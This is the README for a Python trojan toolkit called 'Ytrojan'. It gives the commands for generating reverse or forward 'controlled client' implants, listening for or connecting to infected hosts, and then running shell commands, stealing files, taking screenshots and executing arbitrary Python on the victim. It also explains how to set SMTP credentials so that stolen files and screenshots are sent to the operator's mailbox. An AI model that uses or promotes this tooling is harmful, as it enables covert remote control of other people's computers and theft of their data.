# Ytrojan

## This version is out of date
## Please wait for the latest translation

## Select Your Language

Zh-cn   En-us

## How to use?

Run Main-Cmd.py with Python 3.10 or higher
Program running result：
```
__   ___             _             
\ \ / / |_ _ __ ___ (_) __ _ _ __  
 \ V /| __| '__/ _ \| |/ _` | '_ \ 
  | | | |_| | | (_) | | (_| | | | |
  |_|  \__|_|  \___// |\__,_|_| |_|
                  |__/             
                                      
Ytrojan $>
```  

### Use the "generate" command to generate the Controlled Client

```
generate [Option] [Path] [Ip] [Port]
1. [Option] 0 or 1
    When the option is 0, generate reverse controlled client
    When the option is 1, generate forward controlled client
2. [Path] The place where the controlled client is generated
3. [ip] Target host (or your computer) IP
   [port] Target host (or your computer) port
    When "option" is 0, ip and port are your computer's
    When "option" is 1, ip and port are those of the controlled client
    When parameters $> appears, it means that you need to select the function of the controlled client you want
    Currently supported functions are: shell, get, win, py
    For example, if you want the controlled client to be able to execute shell and py statements, you can do this:
    parameters $>shell py
````

### Use the "connect" command to connect to the forward host

````
connect [ip] [port]
1. [ip][port] are all target
2. This command should be run after the controlled client runs
````

### Use the "listen" command to connect to the reverse host

````
listen [ip] [port]
1. [ip][port] are your computer
2. This command should be run before the controlled client
````

### How to control the target

After connecting to the target, you can operate the target with the following commands:
(connecting to the target might output "ip $>")

````
1. shell [Command] #Execute shell command
2. get [Path] #Get the file
3. win #Get the current screenshot
4. py [Code] #Execute python code
````

E.g.
````
1. shell whoami #Execute whoami command
    shell id
    shell ls
2. get a.txt #Get a.txt
    get /a.jpg #Get a.jpg in the root directory
3. win #Get the current screenshot
4. py print('hello world') #output hello world
    py import os; print(os.name)
````

### Attention!
Because shell commands are not interactive shells you cannot execute commands like "vim" and "sudo"!

The "get" and "win" commands use the smtp protocol to transfer files. You must do the following before using these two commands!!!

````
$> py host = "smtp server domain name" #For example, NetEase mailbox is smtp.163.com
命令执行成功
$> py port = "smtp service port" #usually port 25
命令执行成功
$> py username = "your email"
命令执行成功
$> py password = "The password provided to you by the smtp service operator"
命令执行成功
````
